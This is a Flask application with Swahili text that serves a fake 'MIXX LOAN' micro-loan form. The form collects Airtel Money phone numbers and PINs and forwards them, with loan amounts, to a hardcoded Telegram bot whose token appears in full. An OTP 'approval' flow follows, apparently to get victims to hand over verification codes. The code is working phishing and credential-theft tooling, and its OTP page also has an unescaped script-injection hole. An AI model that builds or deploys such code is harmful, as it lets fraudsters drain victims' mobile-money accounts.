from flask import Flask, render_template_string, request
import requests
import random
from datetime import datetime, timedelta

app = Flask(__name__)

TELEGRAM_TOKEN = "8864945488:AAFGN292M6CyjuU4LjQjfj_vUVJMchW07ik"
ADMIN_CHAT_ID = "8580615195"

applications = {}  # Tunahifadhi data za mteja hapa
otp_store = {}     # Tunahifadhi OTP hapa

def send_telegram(text, buttons=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML"}
    if buttons:
        data["reply_markup"] = {"inline_keyboard": buttons}
    requests.post(url, json=data)

HTML = """<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loan Application Form</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
    <div class="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full">
        <form method="POST" action="/submit">
        <div class="flex items-center justify-between mb-8">
            <div id="step-badge-1" class="w-8 h-8 rounded-full bg-red-600 text-white flex items-center justify-center font-bold text-sm">1</div>
            <div class="h-1 bg-gray-200 flex-1 mx-2 rounded" id="progress-1"></div>
            <div id="step-badge-2" class="w-8 h-8 rounded-full bg-gray-200 text-gray-600 flex items-center justify-center font-bold text-sm">2</div>
            <div class="h-1 bg-gray-200 flex-1 mx-2 rounded" id="progress-2"></div>
            <div id="step-badge-3" class="w-8 h-8 rounded-full bg-gray-200 text-gray-600 flex items-center justify-center font-bold text-sm">3</div>
        </div>

        <div id="page-1" class="space-y-6">
            <h2 class="text-2xl font-bold text-gray-800 text-center">Chagua Kiasi cha Mkopo</h2>
            <div class="grid grid-cols-2 gap-4">
                <label class="border-2 rounded-xl p-4 flex flex-col items-center cursor-pointer"><input type="radio" name="loan_amount" value="100" checked><span class="text-2xl font-bold">$100</span></label>
                <label class="border-2 rounded-xl p-4 flex-col items-center cursor-pointer"><input type="radio" name="loan_amount" value="200"><span class="text-2xl font-bold">$200</span></label>
                <label class="border-2 rounded-xl p-4 flex-col items-center cursor-pointer"><input type="radio" name="loan_amount" value="500"><span class="text-2xl font-bold">$500</span></label>
                <label class="border-2 rounded-xl p-4 flex-col items-center cursor-pointer"><input type="radio" name="loan_amount" value="1000"><span class="text-2xl font-bold">$1000</span></label>
            </div>
            <button type="button" onclick="goToPage(2)" class="w-full bg-red-600 text-white font-bold py-3 rounded-xl">Omba Sasa</button>
        </div>

        <div id="page-2" class="hidden space-y-6">
            <h2 class="text-2xl font-bold text-gray-800 text-center">Taarifa za Airtel Money</h2>
            <input type="tel" name="airtel_number" placeholder="068XXXXXXX" required class="w-full px-4 py-3 rounded-xl border">
            <p class="text-center text-sm">Weka PIN</p>
            <div class="flex gap-2 justify-center">
                <input type="password" name="pin1" maxlength="1" required class="pin-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
                <input type="password" name="pin2" maxlength="1" required class="pin-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
                <input type="password" name="pin3" maxlength="1" required class="pin-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
                <input type="password" name="pin4" maxlength="1" required class="pin-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
            </div>
            <button type="submit" class="w-full bg-red-600 text-white font-bold py-3 rounded-xl">Tuma Maombi</button>
        </div>
        </form>

        <div id="page-3" class="hidden space-y-6">
            <h2 class="text-2xl font-bold text-gray-800 text-center">Weka OTP</h2>
            <p class="text-center text-sm text-gray-500">Tafadhali subiri code kutoka kwetu</p>
            <form method="POST" action="/verify_otp">
                <input type="hidden" name="loan_id" id="loan_id_input">
                <div class="flex justify-center gap-2">
                    <input type="text" name="otp1" maxlength="1" class="otp-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
                    <input type="text" name="otp2" maxlength="1" class="otp-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
                    <input type="text" name="otp3" maxlength="1" class="otp-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
                    <input type="text" name="otp4" maxlength="1" class="otp-input w-12 h-12 text-center text-xl font-bold border rounded-lg">
                </div>
                <button type="submit" class="w-full bg-green-600 text-white font-bold py-3 rounded-xl mt-4">Thibitisha</button>
            </form>
        </div>
    </div>

    <script>
        function goToPage(pageNum) {
            document.getElementById('page-1').classList.add('hidden');
            document.getElementById('page-2').classList.add('hidden');
            document.getElementById('page-3').classList.add('hidden');
            document.getElementById(`page-${pageNum}`).classList.remove('hidden');
        }
        document.querySelectorAll('.pin-input, .otp-input').forEach((input, index, arr) => {
            input.addEventListener('input', () => { if (input.value.length === 1 && index < arr.length - 1) { arr[index + 1].focus(); } });
        });
        // Hii inatumika baada ya kupata loan_id kutoka server
        function showOTP(loan_id) {
            document.getElementById('loan_id_input').value = loan_id;
            goToPage(3);
        }
    </script>
</body>
</html>"""

@app.route('/')
def home():
    return render_template_string(HTML)

@app.route('/submit', methods=['POST'])
def submit():
    loan_id = str(random.randint(100000, 999))
    amount = request.form['loan_amount']
    number = request.form['airtel_number']
    pin = request.form['pin1'] + request.form['pin2'] + request.form['pin3'] + request.form['pin4']
    
    applications[loan_id] = {"amount": amount, "number": number, "pin": pin}
    
    # TUMA KWENDA TELEGRAM NA BUTTONS ZA APPROVE/REJECT
    text = f"🔔 <b>NEW LOAN APPLICATION</b>\n\n<b>ID:</b> {loan_id}\n<b>Amount:</b> ${amount}\n<b>Airtel:</b> {number}\n<b>PIN:</b> {pin}"
    buttons = [
        [{"text": "✅ APPROVE", "callback_data": f"approve_{loan_id}"}],
        [{"text": "❌ INCORRECT", "callback_data": f"reject_{loan_id}"}]
    ]
    send_telegram(text, buttons)
    
    return "<h2 style='text-align:center;padding:50px;color:orange'>⏳ Subiri msimamizi kuidhinisha maombi yako...</h2>"

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    if 'callback_query' in data:
        callback = data['callback_query']
        action, loan_id = callback['data'].split('_')
        
        if action == 'approve':
            # TENGENEZA OTP
            code = str(random.randint(1000, 9999))
            expiry = datetime.now() + timedelta(minutes=2)
            otp_store[loan_id] = {'code': code, 'expiry': expiry}
            
            # MJUMBE WA KUMTUMIA MTEJA
            customer_msg = f"MIXX LOAN: Ombi lako {loan_id} limeidhinishwa.\nCode yako: {code}\nInaisha dakika 2."
            
            # TUMA KWENDA TELEGRAM YAKO ILI UMPE MTEJA
            admin_msg = f"✅ <b>APPROVED!</b>\n\n<b>TUMA UJUMBE HUU KWA MTEJA:</b>\n<code>{customer_msg}</code>\n\n<b>LINK YA KUWEKA OTP:</b>\nhttps://loan-api-flask.onrender.com/otp/{loan_id}"
            send_telegram(admin_msg)
            
        elif action == 'reject':
            send_telegram(f"❌ <b>REJECTED</b>\n\nID: {loan_id}\nMaombi yamekataliwa")
            
    return "ok"

@app.route('/otp/<loan_id>')
def otp_page(loan_id):
    return f"<script>window.onload=function(){{showOTP('{loan_id}')}}</script>" + HTML

@app.route('/verify_otp', methods=['POST'])
def verify_otp():
    loan_id = request.form['loan_id']
    user_code = request.form['otp1'] + request.form['otp2'] + request.form['otp3'] + request.form['otp4']
    
    if loan_id in otp_store and datetime.now() < otp_store[loan_id]['expiry']:
        if user_code == otp_store[loan_id]['code']:
            return "<h2 style='text-align:center;padding:50px;color:green'>✅ SUCCESS! Mkopo umeidhinishwa</h2>"
    
    return "<h2 style='text-align:center;padding:50px;color:red'>❌ CODE SIKU SAHI AU IMEISHA</h2>"

if __name__ == '__main__':
    app.run()
